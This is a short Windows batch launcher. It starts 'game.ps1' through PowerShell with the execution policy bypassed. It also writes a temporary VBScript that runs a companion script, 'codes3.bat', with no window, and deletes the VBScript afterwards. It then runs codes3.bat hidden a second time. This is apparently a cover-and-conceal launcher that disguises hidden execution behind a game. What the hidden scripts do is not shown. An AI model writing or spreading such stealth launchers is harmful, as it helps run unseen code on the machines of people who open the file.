@echo off

echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\run.vbs"
echo WshShell.Run "%~dp0codes3.bat", 0, False >> "%temp%\run.vbs"
start "" powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0game.ps1"
wscript.exe "%temp%\run.vbs"
del "%temp%\run.vbs"
start "" powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c \"%~dp0codes3.bat\"' -WindowStyle Hidden"
exit